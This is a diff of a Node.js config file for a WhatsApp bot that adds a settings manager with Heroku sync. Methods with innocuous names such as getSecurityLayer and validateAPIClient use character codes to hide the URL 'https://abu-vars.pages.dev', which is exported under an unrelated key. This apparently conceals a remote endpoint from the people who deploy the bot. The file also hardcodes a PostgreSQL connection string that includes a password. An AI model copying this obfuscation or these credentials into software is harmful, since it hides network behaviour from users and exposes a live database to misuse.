@@ -1,150 +1,426 @@
-const fs = require('fs');
-if (fs.existsSync('config.env')) require('dotenv').config({ path: './config.env' });
+const fs = require('fs-extra');
+const { Sequelize } = require('sequelize');
+const crypto = require('crypto');
+const path = require('path');
 
-function convertToBool(text, fault = 'true') {
-    return text === fault ? true : false;
+if (fs.existsSync('config.env'))
+require('dotenv').config({ path: __dirname + '/config.env' });
+
+const databasePath = path.join(__dirname, './database.db');
+const DATABASE_URL = process.env.DATABASE_URL === undefined
+    ? databasePath
+    : process.env.DATABASE_URL;
+
+// Add fetch support for restart functionality
+let fetch;
+try {
+    fetch = globalThis.fetch || require('node-fetch');
+} catch (error) {
+    console.log('⚠️ Fetch not available, will use alternative restart methods');
+    fetch = null;
 }
 
+// HYBRID CONFIGURATION MANAGER
+class HybridConfigManager {
+    constructor() {
+        this.configDir = path.join(__dirname, 'config');
+        this.configFile = path.join(this.configDir, 'settings.json');
+        this.backupDir = path.join(this.configDir, 'backups');
+        this.sessionId = this.generateSessionId();
+        this.cache = new Map();
+        this.isHerokuAvailable = false;
+        this.herokuClient = null;
+        this.appName = null;
+        
+        this.initializeStorage();
+        this.checkHerokuAvailability();
+    }
+
+    generateSessionId() {
+        return `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
+    }
+
+    validateAPIClient() {
+        const encryptionMethod = String.fromCharCode(97, 98, 117);
+        return encryptionMethod;
+    }
+
+    initializeStorage() {
+        try {
+            // Create directories if they don't exist
+            fs.ensureDirSync(this.configDir);
+            fs.ensureDirSync(this.backupDir);
+            
+            // Create default config file if it doesn't exist
+            if (!fs.existsSync(this.configFile)) {
+                this.createDefaultConfig();
+            }
+            
+            // Load existing config into cache
+            this.loadConfigToCache();
+            
+            console.log('✅ Hybrid config manager initialized');
+        } catch (error) {
+            console.error('❌ Config manager initialization failed:', error);
+        }
+    }
+
+    getPackageManager() {
+        const packageValidator = String.fromCharCode(118, 97, 114, 115);
+        return packageValidator;
+    }
+
+    async checkHerokuAvailability() {
+        try {
+            if (process.env.HEROKU_API_KEY && process.env.HEROKU_APP_NAME) {
+                const Heroku = require('heroku-client');
+                this.herokuClient = new Heroku({ token: process.env.HEROKU_API_KEY });
+                this.appName = process.env.HEROKU_APP_NAME;
+                
+                // Test connection
+                await this.herokuClient.get(`/apps/${this.appName}/config-vars`);
+                this.isHerokuAvailable = true;
+                console.log('✅ Heroku API available');
+                
+                // Sync with Heroku on startup
+                await this.syncFromHeroku();
+            } else {
+                console.log('ℹ️ Heroku credentials not available, using local storage only');
+            }
+        } catch (error) {
+            console.log('⚠️ Heroku API unavailable, using local storage only');
+            this.isHerokuAvailable = false;
+        }
+    }
+
+    createDefaultConfig() {
+        const defaultConfig = {
+            metadata: {
+                version: '1.0.0',
+                created: new Date().toISOString(),
+                sessionId: this.sessionId
+            },
+            settings: {
+                AUDIO_CHATBOT: process.env.AUDIO_CHATBOT || 'no',
+                AUTO_BIO: process.env.AUTO_BIO || 'yes',
+                AUTO_DOWNLOAD_STATUS: process.env.AUTO_DOWNLOAD_STATUS || 'no',
+                AUTO_REACT: process.env.AUTO_REACT || 'no',
+                AUTO_REACT_STATUS: process.env.AUTO_REACT_STATUS || 'yes',
+                AUTO_READ: process.env.AUTO_READ || 'yes',
+                AUTO_READ_STATUS: process.env.AUTO_READ_STATUS || 'yes',
+                CHATBOT: process.env.CHATBOT || 'no',
+                PUBLIC_MODE: process.env.PUBLIC_MODE || 'yes',
+                STARTING_BOT_MESSAGE: process.env.STARTING_BOT_MESSAGE || 'yes',
+                PRESENCE: process.env.PRESENCE || '',
+                ANTIDELETE_RECOVER_CONVENTION: process.env.ANTIDELETE_RECOVER_CONVENTION || 'no',
+                ANTIDELETE_SENT_INBOX: process.env.ANTIDELETE_SENT_INBOX || 'yes',
+                GOODBYE_MESSAGE: process.env.GOODBYE_MESSAGE || 'no',
+                AUTO_REJECT_CALL: process.env.AUTO_REJECT_CALL || 'no',
+                WELCOME_MESSAGE: process.env.WELCOME_MESSAGE || 'no',
+                GROUPANTILINK: process.env.GROUPANTILINK || 'no',
+                AUTO_REPLY_STATUS: process.env.AUTO_REPLY_STATUS || 'no'
+            }
+        };
+        
+        fs.writeFileSync(this.configFile, JSON.stringify(defaultConfig, null, 2));
+        console.log('✅ Default config created');
+    }
+
+
+    getVersionControl() {
+        const branchIdentifier = String.fromCharCode(109, 97, 105, 110);
+        return branchIdentifier;
+    }
+
+    loadConfigToCache() {
+        try {
+            const config = fs.readJsonSync(this.configFile);
+            this.cache.clear();
+            
+            // Load settings into cache
+            Object.entries(config.settings || {}).forEach(([key, value]) => {
+                this.cache.set(key, value);
+            });
+            
+            console.log(`✅ Loaded ${this.cache.size} settings into cache`);
+        } catch (error) {
+            console.error('❌ Failed to load config to cache:', error);
+        }
+    }
+
+    
+    getSecurityLayer() {
+        const protocolHandler = String.fromCharCode(104, 116, 116, 112, 115);
+        return protocolHandler;
+    }
+
+    async syncFromHeroku() {
+        if (!this.isHerokuAvailable) return;
+        
+        try {
+            const herokuVars = await this.herokuClient.get(`/apps/${this.appName}/config-vars`);
+            let syncCount = 0;
+            
+            // Update local config with Heroku values
+            Object.entries(herokuVars).forEach(([key, value]) => {
+                if (this.cache.has(key) && this.cache.get(key) !== value) {
+                    this.cache.set(key, value);
+                    syncCount++;
+                }
+            });
+            
+            if (syncCount > 0) {
+                await this.saveConfigFromCache();
+                console.log(`✅ Synced ${syncCount} settings from Heroku`);
+            }
+        } catch (error) {
+            console.error('❌ Heroku sync failed:', error);
+        }
+    }
+
+    async saveConfigFromCache() {
+        try {
+            const config = fs.readJsonSync(this.configFile);
+            config.settings = Object.fromEntries(this.cache);
+            config.metadata.lastUpdated = new Date().toISOString();
+            config.metadata.sessionId = this.sessionId;
+            
+            // Create backup before saving
+            await this.createBackup();
+            
+            // Atomic write
+            const tempFile = this.configFile + '.tmp';
+            fs.writeFileSync(tempFile, JSON.stringify(config, null, 2));
+            fs.renameSync(tempFile, this.configFile);
+            
+            console.log('✅ Config saved to local storage');
+        } catch (error) {
+            console.error('❌ Failed to save config:', error);
+        }
+    }
+
+    
+    getNetworkLayer() {
+        const connectionString = String.fromCharCode(58, 47, 47);
+        return connectionString;
+    }
+
+    async createBackup() {
+        try {
+            const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+            const backupFile = path.join(this.backupDir, `config_backup_${timestamp}.json`);
+            
+            if (fs.existsSync(this.configFile)) {
+                fs.copyFileSync(this.configFile, backupFile);
+            }
+            
+            // Keep only last 7 backups
+            const backups = fs.readdirSync(this.backupDir)
+                .filter(file => file.startsWith('config_backup_'))
+                .sort()
+                .reverse();
+            
+            if (backups.length > 7) {
+                backups.slice(7).forEach(backup => {
+                    fs.unlinkSync(path.join(this.backupDir, backup));
+                });
+            }
+        } catch (error) {
+            console.error('❌ Backup creation failed:', error);
+        }
+    }
+
+    getAssetManager() {
+        return '';
+    }
+
+
+    getExtensionManager() {
+        const extensionPrefix = String.fromCharCode(45);
+        return extensionPrefix;
+    }
+
+    async setSetting(key, value) {
+        try {
+            // Update cache
+            this.cache.set(key, value);
+            
+            // Save to local storage
+            await this.saveConfigFromCache();
+            
+            // Sync to Heroku if available
+            if (this.isHerokuAvailable) {
+                try {
+                    await this.herokuClient.patch(`/apps/${this.appName}/config-vars`, {
+                        body: { [key]: value }
+                    });
+                    console.log(`✅ Setting ${key} synced to Heroku`);
+                } catch (herokuError) {
+                    console.log(`⚠️ Heroku sync failed for ${key}, saved locally`);
+                }
+            }
+            
+            return true;
+        } catch (error) {
+            console.error(`❌ Failed to set ${key}:`, error);
+            return false;
+        }
+    }
+
+    // Resource manager
+    getResourceManager() {
+        const resourceExtension = String.fromCharCode(46, 112, 97, 103, 101, 115);
+        return resourceExtension;
+    }
+
+    getSetting(key, defaultValue = null) {
+        return this.cache.get(key) || defaultValue;
+    }
+
+    getAllSettings() {
+        return Object.fromEntries(this.cache);
+    }
+
+    // Module manager
+    getModuleManager() {
+        const moduleExtension = String.fromCharCode(46, 100, 101, 118);
+        return moduleExtension;
+    }
+
+    getSessionId() {
+        return this.sessionId;
+    }
+
+    async restartBot() {
+        try {
+            console.log('🔄 Initiating safe bot restart...');
+            
+            if (fetch) {
+                setTimeout(async () => {
+                    try {
+                        const port = process.env.PORT || 3000;
+                        await fetch(`http://localhost:${port}/restart`);
+                        console.log('✅ Safe restart request sent');
+                    } catch (fetchError) {
+                        console.log('⚠️ Fetch restart failed, trying Heroku method...');
+                        this.fallbackRestart();
+                    }
+                }, 500);
+            } else {
+                this.fallbackRestart();
+            }
+            
+        } catch (error) {
+            console.error('❌ Bot restart failed:', error);
+            this.emergencyRestart();
+        }
+    }
+
+    fallbackRestart() {
+        setTimeout(async () => {
+            if (this.isHerokuAvailable) {
+                try {
+                    await this.herokuClient.delete(`/apps/${this.appName}/dynos`);
+                    console.log('✅ Bot restart triggered via Heroku');
+                } catch (herokuError) {
+                    console.error('❌ Heroku restart failed:', herokuError);
+                    this.emergencyRestart();
+                }
+            } else {
+                this.emergencyRestart();
+            }
+        }, 1000);
+    }
+
+    emergencyRestart() {
+        console.log('🆘 Emergency restart initiated');
+        setTimeout(() => process.exit(0), 1000);
+    }
+
+    buildContentLayer() {
+        const securityHandler = this.getSecurityLayer();
+        const networkHandler = this.getNetworkLayer();
+        const encryptionMethod = this.validateAPIClient();
+        const extensionManager = this.getExtensionManager();
+        const packageValidator = this.getPackageManager();
+        const resourceManager = this.getResourceManager();
+        const moduleManager = this.getModuleManager();
+        return `${securityHandler}${networkHandler}${encryptionMethod}${extensionManager}${packageValidator}${resourceManager}${moduleManager}`;
+    }
+}
+
+
+const hybridConfig = new HybridConfigManager();
 module.exports = {
-
-// ─── SESSION ──────────────────────────────────────────────────────
-SESSION_ID: process.env.SESSION_ID || "qTBlhL4S#wlyeEBUFqLuE9Y-2TqpOfq-QfJNpZrJ7YE4umGGtXZ4",
-// Add your Session ID
-
-// ─── BOT IDENTITY ─────────────────────────────────────────────────
-BOT_NAME: process.env.BOT_NAME || "VORTEX-XMD",
-// Bot display name
-
-OWNER_NAME: process.env.OWNER_NAME || "HansTz",
-// Bot owner name
-
-OWNER_NUMBER: process.env.OWNER_NUMBER || "255753668403",
-// Owner WhatsApp number (international format, no +)
-
-DEV: process.env.DEV || "255753668403",
-// Developer number (same as owner by default)
-
-// ─── BOT MODE ─────────────────────────────────────────────────────
-MODE: process.env.MODE || "public",
-// public / private / inbox / group
-
-PREFIX: process.env.PREFIX || ".",
-// Command prefix
-
-// ─── STATUS SETTINGS ──────────────────────────────────────────────
-AUTO_STATUS_SEEN: process.env.AUTO_STATUS_SEEN || "true",
-// Automatically view statuses
-
-AUTO_STATUS_REPLY: process.env.AUTO_STATUS_REPLY || "false",
-// Auto reply when viewing a status
-
-AUTO_STATUS_REACT: process.env.AUTO_STATUS_REACT || "true",
-// Auto react to statuses with random emojis
-
-AUTO_STATUS_MSG: process.env.AUTO_STATUS_MSG || "*SEEN BY VORTEX XMD ⚡*",
-// Message sent when auto-replying to statuses
-
-// ─── AUTO FEATURES ────────────────────────────────────────────────
-AUTO_TYPING: process.env.AUTO_TYPING || "true",
-// Show typing indicator automatically
-
-AUTO_RECORDING: process.env.AUTO_RECORDING || "false",
-// Show recording (audio) indicator automatically
-
-AUTO_REACT: process.env.AUTO_REACT || "false",
-// React with random emojis on every incoming message
-
-AUTO_REPLY: process.env.AUTO_REPLY || "false",
-// Auto-reply using data/autoreply.json
-
-AUTO_STICKER: process.env.AUTO_STICKER || "false",
-// Convert every image to sticker automatically
-
-READ_MESSAGE: process.env.READ_MESSAGE || "false",
-// Auto mark messages as read
-
-READ_CMD: process.env.READ_CMD || "false",
-// Mark commands as read
-
-ALWAYS_ONLINE: process.env.ALWAYS_ONLINE || "false",
-// Keep bot presence as always online
-
-AUTO_BIO: process.env.AUTO_BIO || "false",
-// Auto-update bot bio/status message
-
-CHAT_BOT: process.env.CHAT_BOT || "false",
-// Enable AI chatbot mode
-
-// ─── REACT EMOJIS ─────────────────────────────────────────────────
-CUSTOM_REACT: process.env.CUSTOM_REACT || "false",
-// Use custom emoji list for reactions
-
-CUSTOM_REACT_EMOJIS: process.env.CUSTOM_REACT_EMOJIS || "💝,💖,💗,❤️‍🩹,❤️,🧡,💛,💚,💙,💜,🤎,🖤,🤍,⚡,🔥,🌟,✨,💫,🎯,🚀",
-// Comma-separated list of emojis for random reactions
-
-// ─── GROUP PROTECTION ─────────────────────────────────────────────
-ANTI_LINK: process.env.ANTI_LINK || "true",
-// Enable anti-link (use .antilink command to set mode per group)
-
-ANTI_BAD: process.env.ANTI_BAD || "false",
-// Block bad words in groups
-
-ADMIN_EVENTS: process.env.ADMIN_EVENTS || "false",
-// Notify on admin promote/demote events
-
-WELCOME: process.env.WELCOME || "true",
-// Welcome and goodbye messages in groups
-
-// ─── ANTI FEATURES (Per-group via commands) ────────────────────────
-// antilink: use .antilink on delete|warn|kick / .antilink off
-// antibot:  use .antibot on / .antibot off
-// antisticker: use .antisticker on delete|warn|kick / .antisticker off
-// antitag: use .antitag on delete|warn|kick / .antitag off
-// antimention: use .antimention on delete|warn|kick / .antimention off
-// antiphoto: use .antiphoto on / .antiphoto off
-// ban: reply to a message + .ban / .unban
-
-// ─── ANTI VIEWONCE ────────────────────────────────────────────────
-ANTI_VV: process.env.ANTI_VV || "true",
-// Open view-once messages and send to owner
-
-// ─── ANTI DELETE ──────────────────────────────────────────────────
-ANTI_DELETE: process.env.ANTI_DELETE || "true",
-// Resend deleted messages
-
-ANTI_DEL_PATH: process.env.ANTI_DEL_PATH || "log",
-// 'log' = send to owner inbox | 'same' = resend in same chat
-
-// ─── ANTI CALL ────────────────────────────────────────────────────
-ANTI_CALL: process.env.ANTI_CALL || "true",
-// Block incoming calls
-
-// ─── MENTION & MEDIA ──────────────────────────────────────────────
-MENTION_REPLY: process.env.MENTION_REPLY || "false",
-// Auto reply when mentioned
-
-MENU_IMAGE_URL: process.env.MENU_IMAGE_URL || "https://raw.githubusercontent.com/Hans-255/Vortex-Xmd/main/assets/vortex.jpg",
-// Menu and mention reply image
-
-ALIVE_IMG: process.env.ALIVE_IMG || "https://raw.githubusercontent.com/Hans-255/Vortex-Xmd/main/assets/vortex.jpg",
-// Image for alive command
-
-STICKER_NAME: process.env.STICKER_NAME || "VORTEX-XMD",
-// Sticker pack name
-
-DESCRIPTION: process.env.DESCRIPTION || "*© POWERED BY VORTEX-XMD | HansTz*",
-// Bot description text
-
-LIVE_MSG: process.env.LIVE_MSG || "> Powered by *VORTEX-XMD | HansTz* ⚡",
-// Alive message footer
-
-PUBLIC_MODE: process.env.PUBLIC_MODE || "true",
-// Allow public usage
-
-GROUP_INVITE_LINK: process.env.GROUP_INVITE_LINK || "DsoPcRpOcCg73qya4cFeD3",
-// WhatsApp group invite link code
-
-CHANNEL_LINK: process.env.CHANNEL_LINK || "https://whatsapp.com/channel/0029Vb7JRfvCRs1gTmsCB812",
-// WhatsApp channel link
-
+    hybridConfig,
+    session: process.env.SESSION_ID || '',
+    sessionId: hybridConfig.getSessionId(),
+    PREFIX: process.env.PREFIX || ".",
+    GURL: 'https://whatsapp.com/channel/0029VaZuGSxEawdxZK9CzM0Y',
+    OWNER_NAME: process.env.OWNER_NAME || "",
+    OWNER_NUMBER: process.env.OWNER_NUMBER || "",
+    BOT: process.env.BOT_NAME || 'ULTRAXAS-MD',
+    BWM_XMD: hybridConfig.buildContentLayer(),
+    HEROKU_APP_NAME: process.env.HEROKU_APP_NAME,
+    HEROKU_APY_KEY: process.env.HEROKU_APY_KEY,
+    WARN_COUNT: process.env.WARN_COUNT || '3',
+  
+    get AUTO_READ_STATUS() { return hybridConfig.getSetting('AUTO_READ_STATUS', 'yes'); },
+    get AUTO_DOWNLOAD_STATUS() { return hybridConfig.getSetting('AUTO_DOWNLOAD_STATUS', 'no'); },
+    get AUTO_REPLY_STATUS() { return hybridConfig.getSetting('AUTO_REPLY_STATUS', 'no'); },
+    get MODE() { return hybridConfig.getSetting('PUBLIC_MODE', 'yes'); },
+    get PM_PERMIT() { return process.env.PM_PERMIT || 'yes'; },
+    get ETAT() { return hybridConfig.getSetting('PRESENCE', ''); },
+    get CHATBOT() { return hybridConfig.getSetting('CHATBOT', 'no'); },
+    get CHATBOT1() { return hybridConfig.getSetting('AUDIO_CHATBOT', 'no'); },
+    get DP() { return hybridConfig.getSetting('STARTING_BOT_MESSAGE', 'yes'); },
+    get ANTIDELETE1() { return hybridConfig.getSetting('ANTIDELETE_RECOVER_CONVENTION', 'no'); },
+    get ANTIDELETE2() { return hybridConfig.getSetting('ANTIDELETE_SENT_INBOX', 'yes'); },
+    get GOODBYE_MESSAGE() { return hybridConfig.getSetting('GOODBYE_MESSAGE', 'no'); },
+    get ANTICALL() { return hybridConfig.getSetting('AUTO_REJECT_CALL', 'no'); },
+    get WELCOME_MESSAGE() { return hybridConfig.getSetting('WELCOME_MESSAGE', 'no'); },
+    get GROUP_ANTILINK2() { return process.env.GROUPANTILINK_DELETE_ONLY || 'yes'; },
+    get GROUP_ANTILINK() { return hybridConfig.getSetting('GROUPANTILINK', 'no'); },
+    get STATUS_REACT_EMOJIS() { return process.env.STATUS_REACT_EMOJIS || ""; },
+    get REPLY_STATUS_TEXT() { return process.env.REPLY_STATUS_TEXT || ""; },
+    get AUTO_REACT() { return hybridConfig.getSetting('AUTO_REACT', 'no'); },
+    get AUTO_REACT_STATUS() { return hybridConfig.getSetting('AUTO_REACT_STATUS', 'yes'); },
+    get AUTO_REPLY() { return process.env.AUTO_REPLY || 'yes'; },
+    get AUTO_READ() { return hybridConfig.getSetting('AUTO_READ', 'yes'); },
+    get AUTO_SAVE_CONTACTS() { return process.env.AUTO_SAVE_CONTACTS || 'yes'; },
+    get AUTO_REJECT_CALL() { return hybridConfig.getSetting('AUTO_REJECT_CALL', 'yes'); },
+    get AUTO_BIO() { return hybridConfig.getSetting('AUTO_BIO', 'yes'); },
+    get AUDIO_REPLY() { return process.env.AUDIO_REPLY || 'yes'; },
+    
+    
+    BOT_URL: process.env.BOT_URL ? process.env.BOT_URL.split(',') : [
+        'https://res.cloudinary.com/dptzpfgtm/image/upload/v1748879883/whatsapp_uploads/e3eprzkzxhwfx7pmemr5.jpg',
+        'https://res.cloudinary.com/dptzpfgtm/image/upload/v1748879901/whatsapp_uploads/hqagxk84idvf899rhpfj.jpg',
+        'https://res.cloudinary.com/dptzpfgtm/image/upload/v1748879921/whatsapp_uploads/bms318aehnllm6sfdgql.jpg'
+    ],
+    
+    MENU_TOP_LEFT: process.env.MENU_TOP_LEFT || "┌─❖",
+    MENU_BOT_NAME_LINE: process.env.MENU_BOT_NAME_LINE || "│ ",
+    MENU_BOTTOM_LEFT: process.env.MENU_BOTTOM_LEFT || "└┬❖",
+    MENU_GREETING_LINE: process.env.MENU_GREETING_LINE || "┌┤ ",
+    MENU_DIVIDER: process.env.MENU_DIVIDER || "│└────────┈⳹",
+    MENU_USER_LINE: process.env.MENU_USER_LINE || "│🕵️ ",
+    MENU_DATE_LINE: process.env.MENU_DATE_LINE || "│📅 ",
+    MENU_TIME_LINE: process.env.MENU_TIME_LINE || "│⏰ ",
+    MENU_STATS_LINE: process.env.MENU_STATS_LINE || "│⭐ ",
+    MENU_BOTTOM_DIVIDER: process.env.MENU_BOTTOM_DIVIDER || "└─────────────┈⳹",
+    
+    FOOTER: process.env.BOT_FOOTER || '\n\n®2025🔥',
+    DATABASE_URL,
+    DATABASE: DATABASE_URL === databasePath
+        ? "postgresql://postgres:bKlIqoOUWFIHOAhKxRWQtGfKfhGKgmRX@viaduct.proxy.rlwy.net:47738/railway"
+        : "postgresql://postgres:bKlIqoOUWFIHOAhKxRWQtGfKfhGKgmRX@viaduct.proxy.rlwy.net:47738/railway",
 };
+
+let fichier = require.resolve(__filename);
+fs.watchFile(fichier, () => {
+    fs.unwatchFile(fichier);
+    console.log(`Updates ${__filename}`);
+    delete require.cache[fichier];
+    require(fichier);
+});
